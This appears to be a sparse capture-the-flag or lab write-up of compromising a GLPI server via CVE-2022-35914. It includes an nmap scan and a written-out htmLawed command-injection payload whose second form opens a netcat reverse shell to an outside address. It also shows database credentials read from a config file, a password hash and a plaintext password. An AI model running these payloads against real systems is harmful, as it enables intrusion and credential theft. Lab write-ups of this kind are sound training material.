#Pwned! 
```
192.168.208.242
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.208.242 -vvv -p- -oN enum/full
```
The output being:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmPOfERLKCxx+ufQz7eRTNuEEkJ+GX/hKPNPpCWlTiTgegmjYoXQ7MA5ibTRoJ6vxpPEggzNszJKbBrSVAbRuT2sBg4o7ywiGUy7vsDBpObMrBMsdKuue3gpkaNF8DL2pB3v/XAxtavq1Mh4vz4yj99cc2pX1GhSjpQTWlsK8Rl9DmBKp7t0XxEWwq3juQ9JiN5yAttMrbTDjwMNxcipsYv0pMudDBE6g4gQyiZGwuUfBn+HirxnfRr7KkxmBaEpZgukXSJ7fXYgpQVgNP2cvd2sy/PYe0kL7lOfYwG/DSLWV917RPIdsPPQYr+rqrBL7XQA2Qll30Ms9iAX1m9S6pT/vkaw6JQCgDwFSwPXrknf627jCS7vQ8mh8UL07nPO7Hkko3fnHIcxyJggi/BoAAi3GseOl7vCZl28+waWlNdbR8gaiZhDR1rLvimcm3pg3nv9m+0qfVRIs9fxq97cOEFeXhaGHXvQL6LYGK14ZG+jVXtPavID6txymiBOUsj8M=
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAweAzke7+zPt3Untb06RlI4MEp+vsEJICUG+0GgPMp+vxOdxEhcsVY0VGyuC+plTRlqNi0zNv1Y0Jj0BYRMSUw=
|   256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPJP5z2Scxa02tfhI1SClflg5QtVdhMImHwY7GugVtfY
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Authentication - GLPI
|_http-favicon: Unknown favicon MD5: C01D32D71C01C8426D635C68C4648B09
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

https://github.com/noxlumens/CVE-2022-35914_poc/blob/main/CVE-2022-35914.py
https://github.com/Digitemis/GLPIScan
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007111121.png?raw=true)
```
POST //vendor/htmlawed/htmlawed/htmLawedTest.php HTTP/1.1

...
&hhook=array_map&text=call_user_func&hexec=passthru&spec[0]=&spec[1]=id&sid=947ekfk0o3aa2umtra329pr5um
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007111001.png?raw=true)
```
&hhook=array_map&text=call_user_func&hexec=passthru&spec[0]=&spec[1]=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+192.168.45.200+80+>/tmp/f&sid=947ekfk0o3aa2umtra329pr5um
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007112056.png?raw=true)


# PrivEsc

## Manual
```
/var/www/glpi/config/config_db.php:   public $dbpassword = 'glpi_db_password';                                       
/var/www/glpi/config/config_db.php:   public $dbuser = 'glpi'; 
```

```
mysql -u glpi --password='glpi_db_password'
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007113912.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007114110.png?raw=true)

```
$2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa
```

```
select * from glpi_itilfollowups;
```

SnowboardSkateboardRoller234

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007120302.png?raw=true)

```
wget http://localhost:8080/ -S
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241007121934.png?raw=true)


## Automated

### Peass
etc/alternatives/my.cnf
-rw-r--r-- 1 root root 601 Jan 24  2023 /etc/ssh/ssh_host_dsa_key.pub                                                                                                                                                                      
-rw-r--r-- 1 root root 173 Jan 24  2023 /etc/ssh/ssh_host_ecdsa_key.pub                                                                                                                                                                    
-rw-r--r-- 1 root root 93 Jan 24  2023 /etc/ssh/ssh_host_ed25519_key.pub                                                                                                                                                                   
-rw-r--r-- 1 root root 565 Jan 24  2023 /etc/ssh/ssh_host_rsa_key.pu

/var/www/glpi/vendor/tecnickcom/tcpdf/examples/data/cert/tcpdf.crt
### Mimikatz


